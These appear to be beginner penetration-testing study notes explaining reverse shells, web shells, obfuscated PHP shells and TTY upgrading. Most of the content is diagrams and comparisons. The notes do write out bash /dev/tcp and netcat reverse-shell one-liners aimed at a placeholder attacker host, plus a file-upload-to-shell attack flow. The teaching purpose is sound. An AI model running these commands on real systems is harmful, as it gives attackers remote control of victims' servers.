- **Reverse shell commands** (you execute a command directly on the target).
- **Reverse shell source code** (you upload or place code on the target, then that code executes and creates the shell).

Let's break it down.

---

# Method 1: Reverse shell using a command

Suppose you have command execution (RCE) on a Linux server.

You can execute a command like:

```
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

or

```
python3 -c '...'
```

or

```
nc ATTACKER_IP 4444 -e /bin/bash
```

These are **commands**.

### What happens?

```
Attacker
     ▲
     │
Listener (nc -lvnp 4444)
     ▲
     │
Target
     │
     └── Executes ONE command
```

The operating system runs that command immediately.

No source code is uploaded.

No file is created.

No script is stored.

---

# Method 2: Reverse shell using source code

Suppose the target is running PHP.

You upload a file called:

```
shell.php
```

Inside it is PHP code that creates a reverse shell.

For example (conceptually):

```
<?php
// PHP code that creates a reverse shell
?>
```

When someone visits:

```
http://target/shell.php
```

the **PHP interpreter executes the code**.

That code then opens a reverse shell.

Flow:

```
Attacker uploads shell.php
           │
           ▼
Target stores shell.php
           │
           ▼
Victim/Attacker accesses shell.php
           │
           ▼
PHP executes the source code
           │
           ▼
Reverse shell connects back
```

Notice that here:

- You uploaded a **program**.
- The server interpreted the program.
- The program generated the reverse shell.


# they're different

### Case 1

You already have command execution.

You run:

```
python3 -c ...
```

Linux executes that command immediately.

Nothing is uploaded.

---

### Case 2

You upload:

```
shell.php
```

The PHP engine reads the PHP code line by line.

Then it executes the code.

The reverse shell comes from the program you uploaded.

The reverse shell is the **goal** in both cases.

The difference is **how you achieve it**:

- **Command-based reverse shell:** You already have the ability to run operating system commands, so you execute one that creates the reverse shell.
- **Code-based reverse shell:** You provide a program (for example, a PHP script). The appropriate interpreter runs that program, and **the program itself** creates the reverse shell.

# Web Shell

![](attachments/Pasted%20image%2020260711213411.png)

A **web shell** is a small script placed on a web server that allows an attacker or authorized security tester to interact with the server **through HTTP/HTTPS**.

Think of it as a **web-based command execution interface**.

---

# Normal website

```
Browser
    │
HTTP Request
    │
    ▼
Web Server (Apache/Nginx/IIS)
    │
    ▼
PHP/ASP.NET/JSP executes code
    │
    ▼
Returns webpage
```

The user only receives HTML pages.

---

# With a web shell

```
Attacker
    │
HTTP Request
    │
    ▼
shell.php
    │
PHP executes commands
    │
    ▼
Linux Command Execution
    │
    ▼
Output returned in browser
```

Instead of showing a normal webpage, the script accepts commands and returns their output.

---

# Why is it called a "web shell"?

Because:

- It runs **through a web server**.
- You control it using a **browser or HTTP requests**.
- It provides shell-like functionality over the web.

It is **not** a terminal by itself.


# Web shell vs Reverse shell

This is where many beginners get confused.

## Web shell

```
Attacker
      │
      ▼
HTTP Request
      │
      ▼
Target Web Server
      │
Executes command
      │
Returns output
      │
      ▲
Attacker
```

Characteristics:

- Communication uses **HTTP/HTTPS**.
- Every command requires a new HTTP request.
- The attacker pulls the output from the server.

---

## Reverse shell

```
Attacker (Listener)
         ▲
         │
TCP Connection
         │
         ▼
Target connects back
```

Characteristics:

- The target initiates a network connection back to the attacker.
- The attacker gets an interactive shell over that connection.
- Commands can be entered continuously without making a new HTTP request each time.

# Example scenario

Imagine you discover a vulnerable PHP file upload.

You upload:

```
shell.php
```

Now browsing to:

```
http://target/uploads/shell.php
```

executes the PHP code.

At this point, you have a **web shell**.

From that web shell, you might then execute a reverse shell command, causing the server to connect back to your listener.

So the flow is:

```
Upload web shell
        │
        ▼
Gain command execution
        │
        ▼
Execute reverse shell command
        │
        ▼
Receive interactive shell
```

This is a very common progression in penetration testing.

---

# Comparison

|Feature|Web Shell|Reverse Shell|
|---|---|---|
|Connection method|HTTP/HTTPS|TCP/UDP (or similar)|
|Initiates connection|Attacker sends requests|Target connects back|
|Interactive|Usually limited; one request per command|Yes|
|Requires browser|Often yes|No|
|Typical use|Initial foothold and command execution|Full interactive access|

---

# Real-world examples

Common web shell languages include:

- PHP (`.php`)
- ASP/ASP.NET (`.asp`, `.aspx`)
- JSP (`.jsp`)
- Perl (`.pl`)
- Python (for Python-based web frameworks)

The language depends on what the web server supports.

# Obfuscated PHP Web Shell

![543](attachments/Pasted%20image%2020260711213630.png)

An **obfuscated PHP web shell** is a PHP web shell whose source code has been deliberately made **difficult for humans and security tools to understand** while still behaving the same way when executed.

The goal of obfuscation is to **hide what the code is actually doing**.

---

## What is obfuscation?

Obfuscation means:

- Renaming variables to meaningless names
- Encoding strings
- Splitting code into many pieces
- Using functions that reconstruct code at runtime
- Hiding dangerous function names
- Making the code hard to read without changing its behavior

## TTY Spawn Shell

![](attachments/Pasted%20image%2020260711223607.png)

A **TTY Spawn Shell** is the process of **upgrading a basic shell into a fully interactive terminal (TTY)**.

This is a very common step after obtaining an initial shell during a penetration test or in a lab environment.

---

# First, what is a TTY?

**TTY** stands for **Teletypewriter**.

Historically:

- Users typed on a physical teletype machine.
- The machine was connected to a Unix computer.
- Linux still refers to terminals as **TTYs**.

Today, a TTY is essentially an **interactive terminal session**.

Examples:

- Terminal window
- SSH session
- Local Linux console
- Interactive Bash shell

---

# Why do we need a TTY?

Many initial shells are **non-interactive**.

For example:

```
Attacker
    ▲
    │
Reverse Shell
    │
    ▼
Target
```

You may get:

```
$
```

It looks like a shell, but it's limited.

---

## Problems with a non-interactive shell

You often cannot:

- Use `sudo`
- Use `su`
- Run editors like `nano` or `vim`
- Use arrow keys for command history
- Use `Ctrl + C` safely (it may terminate the connection)
- Run interactive programs such as `passwd`
- Get proper job control (`Ctrl + Z`, `fg`, `bg`)

---

## After spawning a TTY

You get a proper terminal that behaves like a normal SSH session.

You can:

- Run interactive programs
- Use `sudo`
- Use `su`
- Use command history
- Resize the terminal
- Use job control

---

You're creating a proper terminal **inside** the existing shell.
